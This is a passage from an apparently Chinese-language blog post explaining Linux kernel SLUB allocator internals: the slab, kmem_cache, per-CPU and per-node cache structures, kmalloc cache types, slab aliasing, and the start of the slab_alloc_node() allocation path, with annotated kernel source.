src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="一、slab：单份-object-池">一、slab：单份 object 池</h2><p>Linux kernel 中用以统筹所有内存的依然是 buddy system，slub allocator 也不例外，其负责向 buddy system 请求内存后分割给多个小 object 后再返还给上层调用者，<strong>单次向 buddy system 所请求的一份连续内存页便称之为一张 slab</strong>，在内核中对应 <code>slab</code> 结构体，<strong>本质上是复用 page 结构体</strong>：</p><blockquote><p>这里我们仅关注 slub，所以笔者仅截取 slub 所需字段</p><blockquote><p>老版本中 slab 是直接内嵌在 page 结构体中的</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* 剩余的 slabs 数量 */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* 第一个空闲对象 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ：该 slab 对应的内存池</li><li><code>freelist</code> ：<strong>Slab 上的空闲对象组织为一个 NULL 结尾的单向链表</strong>，该指针指向第一个空闲对象，耗尽时为 NULL</li><li><code>slab_list</code> ：按用途连接多个 slabs 的双向链表</li><li><code>inuse</code> ：已被使用的对象数量</li><li><code>objects</code>：该 slab 上的对象总数</li><li><code>frozen</code>：是否被冻结，即<strong>已经归属于特定的 CPU</strong></li></ul><blockquote><p>这里我们需要注意的是 <strong>counters 成员直接涵盖了 inuse &amp; objects &amp; frozen</strong>，后面会有大量的直接通过 counters 成员进行赋值的操作，<strong>实际上就是赋值了 inuse &amp; objects &amp; frozen</strong></p></blockquote><p>正如一个 page 结构体直接对应一张内存页（或复合页），复用了 page 结构体的 slab 也<strong>直接对应一份 slab 内存页</strong>，借助 <code>page_to_pfn()</code> 等函数可以直接完成 slab 结构体到对应内存页虚拟地址的转换，反之亦然，即<strong>我们可以直接通过一个空闲对象的虚拟地址找到对应的 slab 结构体</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="二、kmem-cache：特定大小-用途对象（堆块）的内存池">二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池</h2><p><code>kmem_cache</code> 为一个基本的 allocator 组件，可以理解为 <strong>用于分配某个特定大小（某种特定用途）的对象的内存池</strong>，所有的 kmem_cache 构成一个双向链表，并存在一个对应的通用 <code>kmem_cache</code> 数组 <code>kmalloc_caches</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>老版本还有个 dma 专用数组 <code>kmalloc_dma_caches</code> ，在 <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">这个 commit</a> 给合并起来了</p></blockquote><h3 id="I-基本结构">I. 基本结构</h3><p>该结构体定义于 <code>include/linux/slub_def.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 缓存管理.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* 用于取回 partial slabs 等. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* 一个对象包含元数据的大小 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* 一个对象不包含元数据的大小 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* 空闲指针的偏移 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* 要保留的 per cpu partial 对象数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* 要保留的 per cpu partial slub 数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* 分配与释放 slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* （译注：向 buddy system）分配时所用的 gfp 标志位 */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* 用于 slab 缓存销毁的引用计数 */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* 元数据的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* 对齐 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab 缓存链表 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// 用于加密 freelist 指针的随机值</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过从一个 remote node 分配以去碎片化.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// 用于在初始化时随机化 freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* 用户拷贝区域的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* 用户拷贝区域的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>： <em>percpu 变量</em> ，指向一个 <code>kmem_cache_cpu</code> 结构体，即<strong>当前 CPU 独占的内存池</strong></p></li><li><p><code>flags</code>：标志位</p></li><li><p><code>min_partial</code>：node partial 链表上 slab 的<strong>最大数量</strong>（👴也不知道为什么要叫min，但实际判定发挥的是max的作用）</p></li><li><p><code>size</code>：一个对象的实际大小</p></li><li><p><code>object_size</code>：一个对象所用数据的大小</p><blockquote><p>例如 <code>struct cred</code> 大小为 176（object_size），实际分配的对象大小为 192 （size）</p></blockquote></li><li><p><code>offset</code>：slab 上空闲对象链表指针在对象上的偏移</p></li><li><p><code>oo</code> ： <em>其实就是一个 int</em></p><ul><li>低 16 位：一张 slab 上的对象数量</li><li>高 16 位：一张 slab 的大小（2<sup>n</sup> 张内存页）</li></ul></li><li><p><code>min</code>：一张 slab 上最少的对象数量</p></li><li><p><code>allocflags</code>：向 buddy system 请求页面时所用的 gfp flag</p></li><li><p><code>ctor</code>：对象的构造函数，在分配对象后会调用该函数进行初始化</p></li><li><p><code>inuse</code>：实际上就是 <code>object_size</code></p></li><li><p><code>align</code>：对象对齐的宽度</p></li><li><p>Randomed freelist 保护相关：</p><ul><li><code>random_seq</code> ：用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序</li></ul></li><li><p>Hardened Usercopy 保护相关</p><ul><li><code>useroffset</code>：用户空间能读写区域的起始偏移</li><li><code>usersize</code>：用户空间能读写区域的大小</li></ul></li><li><p><code>node</code>：一个 <code>kmem_cache_node</code> 数组，对应多个<strong>不同 node 的后备内存池</strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-类型">II. 类型</h3><p>初始时一共有如下几种类型的 <code>kmem_cache</code>，在进行内存分配时若未指定内存池则会根据对应的 flag 从不同的 <code>kmem_cache</code> 中取：</p><ul><li><code>KMALLOC_NORMAL</code> ：通用类型内存池，对应 <code>kmalloc-*</code>，对应分配 flag 为 <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>：用于 DMA 的内存池，对应 <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> 可以被回收的内存池，对应 <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ：用于需要进行数量统计（<code>accounted</code>，主要用于 CGROUP 相关）的内存池，对应 <code>kmalloc-cg-*</code> ，对应分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>若是未开启对应的编译选项，则默认合并入 <code>KMALLOC_NORMAL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-alias（mergeability）">III. slab alias（mergeability）</h3><p>slab alias 机制是一种对同等/相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等/近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></li></ul><blockquote><p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p></blockquote><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h2 id="三、kmem-cache-cpu：各-CPU-独占内存池">三、kmem_cache_cpu：各 CPU 独占内存池</h2><p>当进程向 slab allocator 请求内存分配时，首先会尝试从当前 CPU 的独占内存池进行分配 ——<code>kmem_cache_cpu</code> 结构体表示<strong>每个 CPU 独占的内存池</strong>，其在 <code>kmem_cache</code> 中为一个 percpu 变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* 指向下一个可用对象的指针 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* 用以内存分配的 slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>：指向下一个空闲对象的指针</li><li><code>slab</code>：当前用以进行内存分配的 slab</li><li><code>partial</code>：percpu partial slab 链表，链表上为仍有一定空闲对象的 slab</li></ul><p>slab 的 freelist 仅当其在 partial 链表上时有用，当一张 slab 为当前 CPU 正在使用的 slab 时，其 freelist 为 NULL，由 <code>kmem_cache_cpu.freelist</code> 指向第一个空闲对象</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="四、kmem-cache-node：各-node-后备内存池">四、kmem_cache_node：各 node 后备内存池</h2><p><strong>每个 <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> 对应的后备内存池</strong>，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</p><blockquote><p>不过大部分计算机都仅有一个 node，所以通常情况下每个 <code>kmem_cache</code> 也就只有一个 <code>kmem_cache_node</code>  😄</p></blockquote><p>因为本文主要讲 slub，所以仅截取 slub 相关字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>：保护 partial 和 full 链表的锁</li><li><code>partial</code>：partial slab 链表，连接<strong>有着部分空闲对象剩余的 slab</strong></li><li><code>nr_partial</code>：partial slab 的数量</li><li><code>full</code>：full slab 链表，连接<strong>空闲对象完全耗尽的 slab</strong>（注：该链表基本上不常用）</li><li><code>nr_slabs</code>：总的 slab 数量</li><li><code>total_objects</code>：总的对象数量</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1>0x02. 对象的分配</h1><h2 id="※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object">※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object</h2><p>在 slab allocator 中存在着多个不同的内存分配接口，其最后都会调用到 <code>slab_alloc_node()</code> 完成内存分配的工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 内联化的快速路径以让分配函数 (kmalloc, kmem_cache_alloc) 中包含快速路径.</span><br><span class="hljs-comment"> * 因此，对于快速路径可以满足的请求，没有函数调用的开销.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径首先检查无锁的空闲链表是否可以被使用.</span><br><span class="hljs-comment"> * 若否，调用 __slab_alloc 进行缓慢处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则我们可以简单地从无锁空闲链表取出下一个对象.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>该函数首先会调用 <code>slab_pre_alloc_hook()</code> 进行分配前的检查工作，不通过则返回 NULL，这一步主要是检查分配标志位是否合法等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>接下来调用 <code>kfence_alloc()</code> 进行内存错误检测，不通过则直接跳转到 <code>out</code>，这里用到了 <em>Kfence (Kernel Electric Fence)</em>  内存纠错机制，主要是检查对 <code>data page</code> 的访问是否越界：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>接下来调用 <code>__slab_alloc_node()</code> 进行正式的内存分配，这一步便是真正的核心分配函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>最后调用 <code>maybe_wipe_obj_freeptr()</code> 将 object 原本存放 next free object 指针的位置清零，之后调用 <code>slab_want_init_on_alloc()</code> 检查标志位是否有 <code>__GFP_ZERO</code>，若有则调用 <code>slab_post_alloc_hook()</code> 将 object 上数据清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 